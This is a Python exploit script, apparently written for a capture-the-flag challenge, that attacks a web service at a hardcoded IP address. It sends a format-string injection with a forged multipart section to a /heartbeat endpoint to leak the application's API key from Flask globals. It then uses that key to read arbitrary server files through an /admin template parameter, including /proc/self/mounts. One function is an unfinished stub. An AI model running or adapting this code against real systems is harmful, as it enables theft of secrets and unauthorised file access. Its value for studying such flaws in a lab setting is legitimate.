import httpx

TARGET = "http://223.6.249.127:36894"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def ssti_payload(api_key, payload):
    """Use SSTI in /admin endpoint"""
    headers = {"Authorization": api_key}
    # Write payload to a file and include it, or use direct path traversal
    # Actually the tmpl parameter allows arbitrary file read
    # But for SSTI we need to find a writable location or use /proc/self/fd trick
    
    # Let me try using /proc/self/fd/0 or environment variables
    pass

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=10.0)
    return r.text

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # The flag is at /flag-<32hex>.txt
    # Let me try to read /proc/self/fd/ to find open files
    # Or read /proc/1/root/ 
    
    # Try reading proc mounts more carefully
    result = read_file_via_admin(api_key, "/proc/self/mounts")
    print("[*] Full mounts:")
    print(result)
    
    print("\n" + "="*50)
    # Try reading /proc/1/cwd
    result2 = read_file_via_admin(api_key, "/proc/1/cwd/../")
    print("[*] /proc/1/cwd/../")
    print(result2[:500] if len(result2) > 500 else result2)
